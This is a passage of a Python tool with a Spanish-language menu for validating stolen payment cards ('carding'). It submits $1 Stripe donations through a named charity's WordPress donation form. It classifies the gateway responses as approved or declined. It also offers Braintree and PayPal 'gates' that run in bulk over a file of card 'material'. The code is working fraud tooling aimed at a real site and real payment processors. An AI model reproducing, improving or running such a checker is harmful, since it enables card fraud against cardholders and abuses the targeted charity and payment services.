------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[fields][0][last]\"

{last.strip()}
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[fields][1]\"

{em}
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[fields][2]\"

1.00
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[stripe-credit-card-cardname]\"

{first.strip()} {last.strip()}
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[fields][3]\"

nulls for moment
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[id]\"

{form}
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[author]\"

1
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[post_id]\"

6677
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[payment_method_id]\"

{token}
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"wpforms[token]\"

{aga}
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"action\"

wpforms_submit
------WebKitFormBoundaryJAY1IGLA3kt2zxyO
Content-Disposition: form-data; name=\"page_url\"

https://patandtheelephant.org/donate/
------WebKitFormBoundaryJAY1IGLA3kt2zxyO--
'''
            res = session.post("https://patandtheelephant.org/wp-admin/admin-ajax.php", headers=headers, data=data, allow_redirects=False)
            if 'Your card was declined.' in res.text or 'requires_action' in res.text:
                return f"Declined ❌, Card Declined"
            elif "Your card's security code is incorrect." in res.text:
                return f"Approved ✅ - Card approved"
            elif '"success":false' in res.text:
                datas=res.json()
                if "footer" in res.text:
                    dta=datas["data"]["errors"]["general"].get("footer", "Null");mssg=found(dta, '<div class="wpforms-error-container">', '</div>')
                else:
                    dta=datas["data"]["errors"]["general"].get("header", "null");mssg=found(dta, '<div class="wpforms-error-container">', '</div>')

                return f"Declined ❌ -  {mssg}"
            else:
                return f"Approved ✅ - Card Approved"
        except Exception as e:
            tb = sys.exc_info()[2];linea=tb.tb_lineno;print(f"Error {e} en la linea {linea}")

def main():
    saludo()
    print("-"*25)
    print(f"Gates disponibles:\n[•] Stripe 1 usd ~ str\n[•] Braintree auth ~ b3\n[•] Paypal 1 mxn ~ pp\n[•] Guardar material ~ sv\n{'-'*50}")
    slect=input("Ingresa el comando del gate [str - pp - b3 - sv]: ")
    if slect.strip()=="str":
        fg = input("Ingresa el archivo con material: ")
        mass(fg,stripe)
    elif slect.strip()=="b3":
        gh=input("Ingresa el archivo con material: ")
        B = BraintreeChecker()
        mass(gh,B.mains)
    elif slect.strip()=="pp":
        hj=input("Ingresa el archivo con material: ")
        mass(hj, paypal1)
    elif slect.strip()=="sv":
        saves();main()
    else:
        print("Gate no encontrado, intenta de nuevo.");main()

main()  
